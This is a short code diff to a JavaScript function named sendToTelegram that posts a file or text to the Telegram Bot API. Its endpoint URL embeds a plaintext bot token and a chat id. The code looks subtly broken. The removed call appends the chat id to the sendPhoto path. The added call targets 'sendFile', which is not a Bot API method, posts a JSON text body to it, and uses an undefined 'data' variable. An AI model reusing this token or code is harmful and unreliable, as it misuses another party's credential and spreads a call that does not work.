@@ -9,9 +9,15 @@ function sendToTelegram() {
         const formData = new FormData();
         formData.append('file', file);
 
-        fetch('https://api.telegram.org/bot6418886656:AAFIB5PNnWr685LMJxycSJRoOZ6nHvPdB6c/sendPhoto/5460358235', {
-            method: 'POST',
-            body: formData
+        fetch("https://api.telegram.org/bot6418886656:AAFIB5PNnWr685LMJxycSJRoOZ6nHvPdB6c/sendFile", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: "5460358235",
+                text: data
+            })
         })
         .then(response => {
             if (response.ok) {
